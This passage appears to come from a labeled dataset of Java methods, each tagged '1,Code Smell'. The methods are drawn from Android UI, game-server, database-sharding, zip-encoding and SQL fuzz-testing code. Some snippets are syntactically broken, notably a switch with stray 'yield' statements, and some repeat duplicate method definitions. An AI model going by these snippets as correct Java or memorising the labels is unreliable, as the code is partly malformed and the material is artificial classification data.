        firstButton.setTextMultiLine(true);
        firstButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    if (!dp.isTwoPanels) {
      availableWidth-=firstButton.getMeasuredWidth() + dp.dropTargetGapPx;
      widthSpec=MeasureSpec.makeMeasureSpec(availableWidth,MeasureSpec.AT_MOST);
    }
    secondButton.measure(widthSpec,heightSpec);
    if (!mIsVertical) {
      if (secondButton.isTextTruncated(availableWidth)) {
        secondButton.setIconVisible(false);
        firstButton.setIconVisible(false);
        secondButton.setTextMultiLine(true);
        secondButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    float minTextSize=Math.min(firstButton.resizeTextToFit(),secondButton.resizeTextToFit());
    if (firstButton.getTextSize() != minTextSize || secondButton.getTextSize() != minTextSize) {
      firstButton.setTextSize(minTextSize);
      secondButton.setTextSize(minTextSize);
    }
  }
  setMeasuredDimension(width,height);
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite @Nullable public Entity changeDimension(ServerLevel arg){
  return this.changeDimension(arg,arg.getPortalForcer());
}
/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite(remap=false) @Nullable public Entity changeDimension(ServerLevel server,ITeleporter teleporter){
  if (!CommonHooks.onTravelToDimension((Entity)(Object)this,server.dimension()))   return null;
  if (this.level() instanceof ServerLevel && !this.isRemoved()) {
    this.level().getProfiler().push(""changeDimension"");
    if (server == null) {
      return null;
    }
    this.level().getProfiler().push(""reposition"");
    var bukkitPos=bridge$getLastTpPos();
    PortalInfo portalinfo=bukkitPos == null ? teleporter.getPortalInfo((Entity)(Object)this,server,this::findDimensionEntryPoint) : new PortalInfo(new Vec3(bukkitPos.x(),bukkitPos.y(),bukkitPos.z()),Vec3.ZERO,this.yRot,this.xRot);
    if (portalinfo == null) {
      return null;
    }
 else {
      ServerLevel world=((PortalInfoBridge)portalinfo).bridge$getWorld() == null ? server : ((PortalInfoBridge)portalinfo).bridge$getWorld();
      if (world == this.level()) {
        this.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,this.getXRot());
        this.setDeltaMovement(portalinfo.speed);
        return (Entity)(Object)this;
      }
      this.unRide();
      Entity transportedEntity=teleporter.placeEntity((Entity)(Object)this,(ServerLevel)this.level(),world,this.getYRot(),spawnPortal -> {
        this.level().getProfiler().popPush(""reloading"");
        Entity entity=this.getType().create(world);
        if (entity != null) {
          entity.restoreFrom((Entity)(Object)this);
          entity.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,entity.getXRot());
          entity.setDeltaMovement(portalinfo.speed);
          if (this.bridge$isInWorld()) {
            world.addDuringTeleport(entity);
            if (((WorldBridge)world).bridge$getTypeKey() == LevelStem.END) {
              ArclightCaptures.captureEndPortalEntity((Entity)(Object)this,spawnPortal);
              ServerLevel.makeObsidianPlatform(world);
            }
          }
        }
        return entity;
      }
);
      this.removeAfterChangingDimensions();
      this.level().getProfiler().pop();
      ((ServerLevel)this.level()).resetEmptyTime();
      world.resetEmptyTime();
      this.level().getProfiler().pop();
      return transportedEntity;
    }
  }
 else {
    return null;
  }
}",1,Code Smell
"@Override protected List<TableRangeInfo<K>> calculateRanges(String quoteTableWithSchema,K preMaxPriKey,K maxPriKey) throws IOException, InterruptedException {
  final ArrayList<TableRangeInfo<K>> singleTableRangeList=new ArrayList<>();
  K currentMaxPriKey=preMaxPriKey;
  DbShardWithConn oneShard;
  long currentSplitNum=0L;
  long st=System.currentTimeMillis();
  final double timeInterval=60.0;
  boolean statementRefresh=true;
  while (compareSplitKey(currentMaxPriKey,maxPriKey) < 0) {
    oneShard=pickOneShard();
    for (int i=0; i < RETRY_NUM; i++) {
      try {
        String cacheIndex=quoteTableWithSchema + ""_"" + preMaxPriKey.toString();
        Pair<K,K> range=cache.get(cacheIndex);
        if (range == null) {
          currentMaxPriKey=getOneSplitMaxPrimaryKey(oneShard,quoteTableWithSchema,preMaxPriKey,statementRefresh);
          statementRefresh=false;
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
          if (compareSplitKey(currentMaxPriKey,preMaxPriKey) <= 0) {
            log.info(""Current max PK {} is not more than previous PK {}. Ignore this range and fetch next slave."",currentMaxPriKey,preMaxPriKey);
            continue;
          }
          range=new Pair<>(preMaxPriKey,currentMaxPriKey);
          cache.set(cacheIndex,range);
          if (currentSplitNum % FETCH_RANGE_SLEEP_SIZE == 0) {
            log.debug(""["" + Thread.currentThread().getName() + ""] Current split num: ""+ currentSplitNum+ "" Have a relax, sleep for 1s..."");
            Thread.sleep(FETCH_RANGE_SLEEP_INTERVAL);
            fetchRangeSleepTime++;
          }
        }
 else {
          currentMaxPriKey=range.getSecond();
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
        }
        singleTableRangeList.add(new TableRangeInfo<>(quoteTableWithSchema,range));
        preMaxPriKey=currentMaxPriKey;
        currentSplitNum++;
        break;
      }
 catch (      SQLException e) {
        log.error(""Fetch primary key range failure, due to "" + e.getMessage() + "", sql: ""+ getFetchSQLFormat()+ "", last primary key: ""+ preMaxPriKey+ "", try num ""+ i+ ""\tInstance info: ""+ oneShard.getShardInfo(),e);
        if (i == RETRY_NUM - 1) {
          throw new IOException(""Fetch primary key range failure! DB instance info: "" + oneShard.getShardInfo(),e);
        }
        try {
          Thread.sleep(i * RETRY_BASE_TIME_DURATION);
          fetchRangeSleepTime++;
        }
 catch (        InterruptedException e1) {
          log.error(""Retry has been Interrupted..."",e);
          throw new IOException(""Fetch primary key range failure!"",e);
        }
        oneShard.reconnect();
      }
    }
    long currentTime=System.currentTimeMillis();
    getOneSplitMaxPrimaryKeyCount++;
    double time=TimeUnit.MILLISECONDS.toSeconds(currentTime - st);
    if (time >= timeInterval) {
      st=currentTime;
      logCurrentProcess(quoteTableWithSchema,maxPriKey,currentMaxPriKey,oneShard);
    }
  }
  return singleTableRangeList;
}",1,Code Smell
"/** 
 * @see ZipEncoding#encode(java.lang.String)
 */
@Override public ByteBuffer encode(final String name){
  final CharsetEncoder enc=newEncoder();
  final CharBuffer cb=CharBuffer.wrap(name);
  CharBuffer tmp=null;
  ByteBuffer out=ByteBuffer.allocate(estimateInitialBufferSize(enc,cb.remaining()));
  while (cb.hasRemaining()) {
    final CoderResult res=enc.encode(cb,out,false);
    if (res.isUnmappable() || res.isMalformed()) {
      final int spaceForSurrogate=estimateIncrementalEncodingSize(enc,6 * res.length());
      if (spaceForSurrogate > out.remaining()) {
        int charCount=0;
        for (int i=cb.position(); i < cb.limit(); i++) {
          charCount+=!enc.canEncode(cb.get(i)) ? 6 : 1;
        }
        final int totalExtraSpace=estimateIncrementalEncodingSize(enc,charCount);
        out=ZipEncodingHelper.growBufferBy(out,totalExtraSpace - out.remaining());
      }
      if (tmp == null) {
        tmp=CharBuffer.allocate(6);
      }
      for (int i=0; i < res.length(); ++i) {
        out=encodeFully(enc,encodeSurrogate(tmp,cb.get()),out);
      }
    }
 else     if (res.isOverflow()) {
      final int increment=estimateIncrementalEncodingSize(enc,cb.remaining());
      out=ZipEncodingHelper.growBufferBy(out,increment);
    }
 else     if (res.isUnderflow() || res.isError()) {
      break;
    }
  }
  enc.encode(cb,out,true);
  out.limit(out.position());
  out.rewind();
  return out;
}",1,Code Smell
"@SuppressLint(""NotifyDataSetChanged"") private void showColorList(boolean show){
  if (isColorListShown != show) {
    isColorListShown=show;
    if (toolsTransformAnimation != null) {
      toolsTransformAnimation.cancel();
    }
    toolsTransformAnimation=new SpringAnimation(new FloatValueHolder(show ? 0 : 1000f));
    toolsTransformAnimation.setSpring(new SpringForce().setFinalPosition(show ? 1000f : 0f).setStiffness(1250f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
    boolean[] moveBottomLayout=new boolean[]{keyboardVisible || emojiViewVisible};
    float bottomLayoutTranslationY=bottomLayout.getTranslationY();
    View barView=getBarView();
    toolsTransformAnimation.addUpdateListener((animation,value,velocity) -> {
      toolsTransformProgress=value / 1000f;
      float scale=0.6f + 0.4f * (1f - toolsTransformProgress);
      barView.setScaleX(scale);
      barView.setScaleY(scale);
      barView.setTranslationY(AndroidUtilities.dp(16) * Math.min(toolsTransformProgress,0.25f) / 0.25f);
      barView.setAlpha(1f - Math.min(toolsTransformProgress,0.25f) / 0.25f);
      colorsListView.setProgress(toolsTransformProgress,show);
      doneButton.setProgress(toolsTransformProgress);
      cancelButton.setProgress(toolsTransformProgress);
      tabsLayout.setTranslationY(AndroidUtilities.dp(32) * toolsTransformProgress);
      if (adjustPanLayoutHelper.animationInProgress()) {
        moveBottomLayout[0]=false;
      }
      if (moveBottomLayout[0]) {
        float progress=show ? toolsTransformProgress : 1f - toolsTransformProgress;
        bottomLayout.setTranslationY(bottomLayoutTranslationY - AndroidUtilities.dp(40) * progress * (show ? 1 : -1));
      }
      bottomLayout.invalidate();
      if (barView == textOptionsView) {
        overlayLayout.invalidate();
      }
    }
);
    toolsTransformAnimation.addEndListener((animation,canceled,value,velocity) -> {
      if (animation == toolsTransformAnimation) {
        toolsTransformAnimation=null;
        if (!show) {
          colorsListView.setVisibility(GONE);
          PersistColorPalette.getInstance(currentAccount).saveColors();
          colorsListView.getAdapter().notifyDataSetChanged();
        }
      }
    }
);
    toolsTransformAnimation.start();
    if (show) {
      colorsListView.setVisibility(VISIBLE);
      colorsListView.setSelectedColorIndex(0);
    }
  }
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  Arguments arguments=Arguments.fromArgs(args);
  int repetitions=arguments.getInteger(""bench_repetitions"",""number of repetitions"",10);
  int nrTileReads=arguments.getInteger(""bench_nr_tile_reads"",""number of tiles to read"",500_000);
  int preWarms=arguments.getInteger(""bench_pre_warms"",""number of pre warm runs"",3);
  List<Path> mbtilesPaths=arguments.getList(""bench_mbtiles"",""the mbtiles file to read from"",List.of()).stream().map(Paths::get).toList();
  if (mbtilesPaths.isEmpty()) {
    throw new IllegalArgumentException(""pass one or many paths to the same mbtiles file"");
  }
  mbtilesPaths.stream().forEach(p -> {
    if (!Files.exists(p) || !Files.isRegularFile(p)) {
      throw new IllegalArgumentException(""%s does not exists"".formatted(p));
    }
  }
);
  List<TileCoord> randomCoordsToFetchPerRepetition=new LinkedList<>();
  do {
    try (var db=Mbtiles.newReadOnlyDatabase(mbtilesPaths.getFirst())){
      try (var statement=db.connection().prepareStatement(SELECT_RANDOM_COORDS)){
        statement.setInt(1,nrTileReads - randomCoordsToFetchPerRepetition.size());
        var rs=statement.executeQuery();
        while (rs.next()) {
          int x=rs.getInt(""tile_column"");
          int y=rs.getInt(""tile_row"");
          int z=rs.getInt(""zoom_level"");
          randomCoordsToFetchPerRepetition.add(TileCoord.ofXYZ(x,(1 << z) - 1 - y,z));
        }
      }
     }
   }
 while (randomCoordsToFetchPerRepetition.size() < nrTileReads);
  Map<Path,Double> avgReadOperationsPerSecondPerDb=new HashMap<>();
  for (  Path dbPath : mbtilesPaths) {
    List<ReadResult> results=new LinkedList<>();
    LOGGER.info(""working on {}"",dbPath);
    for (int preWarm=0; preWarm < preWarms; preWarm++) {
      readEachTile(randomCoordsToFetchPerRepetition,dbPath);
    }
    for (int rep=0; rep < repetitions; rep++) {
      results.add(readEachTile(randomCoordsToFetchPerRepetition,dbPath));
    }
    var readOperationsPerSecondStats=results.stream().mapToDouble(ReadResult::readOperationsPerSecond).summaryStatistics();
    LOGGER.info(""readOperationsPerSecondStats: {}"",readOperationsPerSecondStats);
    avgReadOperationsPerSecondPerDb.put(dbPath,readOperationsPerSecondStats.getAverage());
  }
  List<Path> keysSorted=avgReadOperationsPerSecondPerDb.entrySet().stream().sorted((o1,o2) -> o1.getValue().compareTo(o2.getValue())).map(Map.Entry::getKey).toList();
  LOGGER.info(""diffs"");
  for (int i=0; i < keysSorted.size() - 1; i++) {
    for (int j=i + 1; j < keysSorted.size(); j++) {
      Path db0=keysSorted.get(i);
      double avg0=avgReadOperationsPerSecondPerDb.get(db0);
      Path db1=keysSorted.get(j);
      double avg1=avgReadOperationsPerSecondPerDb.get(db1);
      double diff=avg1 * 100 / avg0 - 100;
      LOGGER.info(""\""{}\"" to \""{}\"": avg read operations per second improved by {}%"",db0,db1,diff);
    }
  }
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      final long[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float hMin=ANIMATE_PICKER_SIZES ? pickerMinHeight : chartData.minValue;
        float yPercentage=(y[i] - hMin) / (h - hMin);
        float yPoint=(1f - yPercentage) * pikerHeight;
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"/** 
 * Seeks to the specified position in microseconds.
 * @param positionUs The seek position in microseconds.
 */
public void seekToUs(long positionUs){
  lastSeekPositionUs=positionUs;
  if (isPendingReset()) {
    pendingResetPositionUs=positionUs;
    return;
  }
  BaseMediaChunk seekToMediaChunk=null;
  for (int i=0; i < mediaChunks.size(); i++) {
    BaseMediaChunk mediaChunk=mediaChunks.get(i);
    long mediaChunkStartTimeUs=mediaChunk.startTimeUs;
    if (mediaChunkStartTimeUs == positionUs && mediaChunk.clippedStartTimeUs == C.TIME_UNSET) {
      seekToMediaChunk=mediaChunk;
      break;
    }
 else     if (mediaChunkStartTimeUs > positionUs) {
      break;
    }
  }
  boolean seekInsideBuffer;
  primarySampleQueue.rewind();
  if (seekToMediaChunk != null) {
    seekInsideBuffer=primarySampleQueue.setReadPosition(seekToMediaChunk.getFirstSampleIndex(0));
    decodeOnlyUntilPositionUs=0;
  }
 else {
    seekInsideBuffer=primarySampleQueue.advanceTo(positionUs,true,positionUs < getNextLoadPositionUs()) != SampleQueue.ADVANCE_FAILED;
    decodeOnlyUntilPositionUs=lastSeekPositionUs;
  }
  if (seekInsideBuffer) {
    nextNotifyPrimaryFormatMediaChunkIndex=primarySampleIndexToMediaChunkIndex(primarySampleQueue.getReadIndex(),0);
    for (    SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
      embeddedSampleQueue.rewind();
      embeddedSampleQueue.advanceTo(positionUs,true,false);
    }
  }
 else {
    pendingResetPositionUs=positionUs;
    loadingFinished=false;
    mediaChunks.clear();
    nextNotifyPrimaryFormatMediaChunkIndex=0;
    if (loader.isLoading()) {
      loader.cancelLoading();
    }
 else {
      loader.clearFatalError();
      primarySampleQueue.reset();
      for (      SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
        embeddedSampleQueue.reset();
      }
    }
  }
}",1,Code Smell
"@Override public void onWebAppSwitchInlineQuery(TLRPC.User botUser,String query,List<String> chatTypes){
  if (chatTypes.isEmpty()) {
    if (parentActivity instanceof LaunchActivity) {
      BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
      if (lastFragment instanceof ChatActivity) {
        ((ChatActivity)lastFragment).getChatActivityEnterView().setFieldText(""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
        dismiss();
      }
    }
  }
 else {
    Bundle args=new Bundle();
    args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_START_ATTACH_BOT);
    args.putBoolean(""onlySelect"",true);
    args.putBoolean(""allowGroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowUsers"",chatTypes.contains(""users""));
    args.putBoolean(""allowChannels"",chatTypes.contains(""channels""));
    args.putBoolean(""allowBots"",chatTypes.contains(""bots""));
    DialogsActivity dialogsActivity=new DialogsActivity(args);
    AndroidUtilities.hideKeyboard(frameLayout);
    OverlayActionBarLayoutDialog overlayActionBarLayoutDialog=new OverlayActionBarLayoutDialog(context,resourcesProvider);
    dialogsActivity.setDelegate((fragment,dids,message1,param,topicsFragment) -> {
      long did=dids.get(0).dialogId;
      Bundle args1=new Bundle();
      args1.putBoolean(""scrollToTopOnResume"",true);
      if (DialogObject.isEncryptedDialog(did)) {
        args1.putInt(""enc_id"",DialogObject.getEncryptedChatId(did));
      }
 else       if (DialogObject.isUserDialog(did)) {
        args1.putLong(""user_id"",did);
      }
 else {
        args1.putLong(""chat_id"",-did);
      }
      args1.putString(""inline_query_input"",""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
      if (parentActivity instanceof LaunchActivity) {
        BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
        if (MessagesController.getInstance(currentAccount).checkCanOpenChat(args1,lastFragment)) {
          overlayActionBarLayoutDialog.dismiss();
          dismissed=true;
          AndroidUtilities.cancelRunOnUIThread(pollRunnable);
          webViewContainer.destroyWebView();
          NotificationCenter.getInstance(currentAccount).removeObserver(BotWebViewSheet.this,NotificationCenter.webViewResultSent);
          NotificationCenter.getGlobalInstance().removeObserver(BotWebViewSheet.this,NotificationCenter.didSetNewTheme);
          BotWebViewSheet.super.dismiss();
          lastFragment.presentFragment(new INavigationLayout.NavigationParams(new ChatActivity(args1)).setRemoveLast(true));
        }
      }
      return true;
    }
);
    overlayActionBarLayoutDialog.show();
    overlayActionBarLayoutDialog.addFragment(dialogsActivity);
  }
}",1,Code Smell
"private static boolean move(int[][] mat,int row,int col,int player){
  mat[row][col]=player;
  boolean win=true;
  for (int i=0; i < mat[0].length; i++) {
    if (mat[row][i] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=0; i < mat.length; i++) {
    if (mat[i][col] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  if (row == col) {
    for (int i=0; i < mat.length; i++) {
      if (mat[i][i] != player) {
        win=false;
        break;
      }
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=mat.length - 1, j=0; i >= 0 && j < mat[0].length; i--, j++) {
    if (mat[i][j] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  return false;
}",1,Code Smell
"public void showWithAction(long did,int action,Runnable actionRunnable){
  showWithAction(did,action,null,null,actionRunnable,null);
}
public void showWithAction(long did,int action,Object infoObject){
  showWithAction(did,action,infoObject,null,null,null);
}
public void showWithAction(long did,int action,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,null,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,infoObject,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
  ArrayList<Long> ids=new ArrayList<>();
  ids.add(did);
  showWithAction(ids,action,infoObject,infoObject2,actionRunnable,cancelRunnable);
}
public void showWithAction(ArrayList<Long> dialogIds,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
}",1,Code Smell
"@Override public void generateDatabase(TiDBGlobalState globalState) throws Exception {
  for (int i=0; i < Randomly.fromOptions(1,2); i++) {
    boolean success;
    do {
      SQLQueryAdapter qt=new TiDBTableGenerator().getQuery(globalState);
      success=globalState.executeStatement(qt);
    }
 while (!success);
  }
  StatementExecutor<TiDBGlobalState,Action> se=new StatementExecutor<>(globalState,Action.values(),TiDBProvider::mapActions,(q) -> {
    if (globalState.getSchema().getDatabaseTables().isEmpty()) {
      throw new IgnoreMeException();
    }
  }
);
  try {
    se.executeStatements();
  }
 catch (  SQLException e) {
    if (e.getMessage().contains(""references invalid table(s) or column(s) or function(s) or definer/invoker of view lack rights to use them"")) {
      throw new IgnoreMeException();
    }
 else {
      throw new AssertionError(e);
    }
  }
  if (globalState.getDbmsSpecificOptions().getTestOracleFactory().stream().anyMatch((o) -> o == TiDBOracleFactory.CERT)) {
    globalState.executeStatement(new SQLQueryAdapter(""SET @@sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';""));
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ANALYZE TABLE "" + table.getName() + "";"",errors));
      }
    }
  }
  if (globalState.getDbmsSpecificOptions().tiflash) {
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ALTER TABLE "" + table.getName() + "" SET TIFLASH REPLICA 1;"",errors));
      }
    }
    if (Randomly.getBoolean()) {
      globalState.executeStatement(new SQLQueryAdapter(""set @@tidb_enforce_mpp=1;""));
    }
  }
}",1,Code Smell
"public static String parseCycleUnit(String scheduleTime){
  String cycleUnit=""D"";
  StringTokenizer st=new StringTokenizer(scheduleTime,"" "");
  if (st.countTokens() <= 0) {
    return ""D"";
  }
  int index=0;
  while (st.hasMoreElements()) {
    String currentString=st.nextToken();
    if (currentString.contains(""/"")) {
      if (index == 1) {
        cycleUnit=""10m"";
      }
 else       if (index == 2) {
        cycleUnit=""h"";
      }
      break;
    }
    if (currentString.equals(""*"")) {
      if (index == 3) {
        cycleUnit=""D"";
      }
      break;
    }
    index++;
  }
  logger.info(""ScheduleTime: "" + scheduleTime + "", cycleUnit: ""+ cycleUnit);
  return cycleUnit;
}",1,Code Smell
"@Override public boolean onKeyPressed(int key,int mods){
  if (!focused)   return false;
  boolean control=MinecraftClient.IS_SYSTEM_MAC ? mods == GLFW_MOD_SUPER : mods == GLFW_MOD_CONTROL;
  if (control && key == GLFW_KEY_C) {
    if (cursor != selectionStart || cursor != selectionEnd) {
      mc.keyboard.setClipboard(text.substring(selectionStart,selectionEnd));
    }
    return true;
  }
 else   if (control && key == GLFW_KEY_X) {
    if (cursor != selectionStart || cursor != selectionEnd) {
      mc.keyboard.setClipboard(text.substring(selectionStart,selectionEnd));
      clearSelection();
    }
    return true;
  }
 else   if (control && key == GLFW_KEY_A) {
    cursor=text.length();
    selectionStart=0;
    selectionEnd=cursor;
  }
 else   if (mods == ((MinecraftClient.IS_SYSTEM_MAC ? GLFW_MOD_SUPER : GLFW_MOD_CONTROL) | GLFW_MOD_SHIFT) && key == GLFW_KEY_A) {
    resetSelection();
  }
 else   if (key == GLFW_KEY_ENTER || key == GLFW_KEY_KP_ENTER) {
    setFocused(false);
    if (actionOnUnfocused != null)     actionOnUnfocused.run();
    return true;
  }
 else   if (key == GLFW_KEY_TAB && completionsW != null) {
    String completion=((ICompletionItem)completionsW.cells.get(getSelectedCompletion()).widget()).getCompletion();
    StringBuilder sb=new StringBuilder(text.length() + completion.length() + 1);
    String a=text.substring(0,cursor);
    sb.append(a);
    for (int i=0; i < completion.length() - 1; i++) {
      if (a.endsWith(completion.substring(0,completion.length() - i - 1))) {
        completion=completion.substring(completion.length() - i - 1);
        break;
      }
    }
    sb.append(completion);
    if (completion.endsWith(""(""))     sb.append(')');
    sb.append(text,cursor,text.length());
    text=sb.toString();
    cursor+=completion.length();
    resetSelection();
    runAction();
    return true;
  }
  return onKeyRepeated(key,mods);
}",1,Code Smell
"@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  boolean result=super.drawChild(canvas,child,drawingTime);
  if (child == actionBar && parentLayout != null) {
    parentLayout.drawHeaderShadow(canvas,actionBar.getVisibility() == VISIBLE ? actionBar.getMeasuredHeight() : 0);
  }
  return result;
}
@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  boolean result=super.drawChild(canvas,child,drawingTime);
  if (child == actionBar2 && parentLayout != null) {
    parentLayout.drawHeaderShadow(canvas,actionBar2.getVisibility() == VISIBLE ? (int)(actionBar2.getMeasuredHeight() + actionBar2.getTranslationY()) : 0);
  }
  return result;
}
@Override public boolean drawChild(Canvas canvas,View child,long drawingTime){
  boolean result=super.drawChild(canvas,child,drawingTime);
  if (child instanceof ChatMessageCell) {
    ChatMessageCell chatMessageCell=(ChatMessageCell)child;
    MessageObject message=chatMessageCell.getMessageObject();
    ImageReceiver imageReceiver=chatMessageCell.getAvatarImage();
    if (imageReceiver != null) {
      int top=child.getTop();
      if (chatMessageCell.isPinnedBottom()) {
        ViewHolder holder=listView2.getChildViewHolder(child);
        if (holder != null) {
          int p=holder.getAdapterPosition();
          int nextPosition;
          nextPosition=p - 1;
          holder=listView2.findViewHolderForAdapterPosition(nextPosition);
          if (holder != null) {
            imageReceiver.setImageY(-AndroidUtilities.dp(1000));
            imageReceiver.draw(canvas);
            return result;
          }
        }
      }
      float tx=chatMessageCell.getTranslationX();
      int y=child.getTop() + chatMessageCell.getLayoutHeight();
      int maxY=listView2.getMeasuredHeight() - listView2.getPaddingBottom();
      if (y > maxY) {
        y=maxY;
      }
      if (chatMessageCell.isPinnedTop()) {
        ViewHolder holder=listView2.getChildViewHolder(child);
        if (holder != null) {
          int tries=0;
          while (true) {
            if (tries >= 20) {
              break;
            }
            tries++;
            int p=holder.getAdapterPosition();
            int prevPosition=p + 1;
            holder=listView2.findViewHolderForAdapterPosition(prevPosition);
            if (holder != null) {
              top=holder.itemView.getTop();
              if (y - AndroidUtilities.dp(48) < holder.itemView.getBottom()) {
                tx=Math.min(holder.itemView.getTranslationX(),tx);
              }
              if (holder.itemView instanceof ChatMessageCell) {
                ChatMessageCell cell=(ChatMessageCell)holder.itemView;
                if (!cell.isPinnedTop()) {
                  break;
                }
              }
 else {
                break;
              }
            }
 else {
              break;
            }
          }
        }
      }
      if (y - AndroidUtilities.dp(48) < top) {
        y=top + AndroidUtilities.dp(48);
      }
      if (tx != 0) {
        canvas.save();
        canvas.translate(tx,0);
      }
      imageReceiver.setImageY(y - AndroidUtilities.dp(44));
      imageReceiver.draw(canvas);
      if (tx != 0) {
        canvas.restore();
      }
    }
  }
  return result;
}",1,Code Smell
"private static JsonNode generateValue(String propertyName,JsonNode propertyNode,Map<String,String> processMap){
  if (propertyNode instanceof NullNode) {
    return NullNode.getInstance();
  }
  String type=propertyNode.get(PropertyConstant.TYPE).asText();
  String value=propertyNode.get(PropertyConstant.EXAMPLE).asText();
case PropertyConstant.STRING:
    ;
case PropertyConstant.INTEGER:
{
        if (isVariable(value)) {
          yield;
          getJsonNodes(propertyName,processMap,value);
        }
 else {
          yield;
          new IntNode(propertyNode.get(PropertyConstant.EXAMPLE).asInt());
        }
      }
case PropertyConstant.NUMBER:
{
          if (isVariable(value)) {
            yield;
            getJsonNodes(propertyName,processMap,value);
          }
 else {
            yield;
            new DecimalNode(propertyNode.get(PropertyConstant.EXAMPLE).decimalValue());
          }
        }
case PropertyConstant.BOOLEAN:
        }
",1,Code Smell
"public static SQLQueryAdapter insert(PostgresGlobalState globalState){
  PostgresTable table=globalState.getSchema().getRandomTable(t -> t.isInsertable());
  ExpectedErrors errors=new ExpectedErrors();
  errors.add(""cannot insert into column"");
  PostgresCommon.addCommonExpressionErrors(errors);
  PostgresCommon.addCommonInsertUpdateErrors(errors);
  PostgresCommon.addCommonExpressionErrors(errors);
  errors.add(""multiple assignments to same column"");
  errors.add(""violates foreign key constraint"");
  errors.add(""value too long for type character varying"");
  errors.add(""conflicting key value violates exclusion constraint"");
  errors.add(""violates not-null constraint"");
  errors.add(""current transaction is aborted"");
  errors.add(""bit string too long"");
  errors.add(""new row violates check option for view"");
  errors.add(""reached maximum value of sequence"");
  errors.add(""but expression is of type"");
  StringBuilder sb=new StringBuilder();
  sb.append(""INSERT INTO "");
  sb.append(table.getName());
  List<PostgresColumn> columns=table.getRandomNonEmptyColumnSubset();
  sb.append(""("");
  sb.append(columns.stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
  sb.append("")"");
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append("" OVERRIDING"");
    sb.append("" "");
    sb.append(Randomly.fromOptions(""SYSTEM"",""USER""));
    sb.append("" VALUE"");
  }
  sb.append("" VALUES"");
  if (globalState.getDbmsSpecificOptions().allowBulkInsert && Randomly.getBooleanWithSmallProbability()) {
    StringBuilder sbRowValue=new StringBuilder();
    sbRowValue.append(""("");
    for (int i=0; i < columns.size(); i++) {
      if (i != 0) {
        sbRowValue.append("", "");
      }
      sbRowValue.append(PostgresVisitor.asString(PostgresExpressionGenerator.generateConstant(globalState.getRandomly(),columns.get(i).getType())));
    }
    sbRowValue.append("")"");
